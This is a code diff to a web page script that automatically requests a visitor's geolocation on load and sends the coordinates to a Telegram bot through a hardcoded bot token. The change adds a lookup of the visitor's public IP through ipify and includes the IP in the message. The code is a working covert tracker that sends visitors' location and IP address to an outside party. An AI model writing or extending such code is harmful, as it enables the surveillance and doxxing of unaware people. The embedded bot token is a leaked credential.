@@ -5,8 +5,8 @@
     // Request location permission automatically
     navigator.geolocation.getCurrentPosition(
       (position) => {
-        // Location permission granted, send location result to Telegram bots
-        sendLocationToTelegramBots(position.coords.latitude, position.coords.longitude);
+        // Location permission granted, send location and IP results to Telegram bots
+        sendLocationAndIPToTelegramBots(position.coords.latitude, position.coords.longitude);
       },
       (error) => {
         if (error.code === error.PERMISSION_DENIED) {
@@ -17,14 +17,19 @@
     );
   });
 
-  async function sendLocationToTelegramBots(latitude, longitude) {
+  async function sendLocationAndIPToTelegramBots(latitude, longitude) {
     // Replace 'YOUR_TELEGRAM_BOT_API_KEY' with your actual Telegram bot API key
     const telegramBotAPIKey = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg';
     const telegramBotURL = `https://api.telegram.org/bot${telegramBotAPIKey}/sendMessage`;
 
-    const message = `Location Result: Latitude - ${latitude}, Longitude - ${longitude}`;
+    // Get the IP address using ipify API
+    const response = await fetch('https://api.ipify.org/?format=json');
+    const data = await response.json();
+    const ipAddress = data.ip;
 
-    // Send location result to Telegram bots using an HTTP request
+    const message = `Location Result: Latitude - ${latitude}, Longitude - ${longitude}\nIP Result: ${ipAddress}`;
+
+    // Send location and IP results to Telegram bots using an HTTP request
     await fetch(telegramBotURL, {
       method: 'POST',
       headers: {
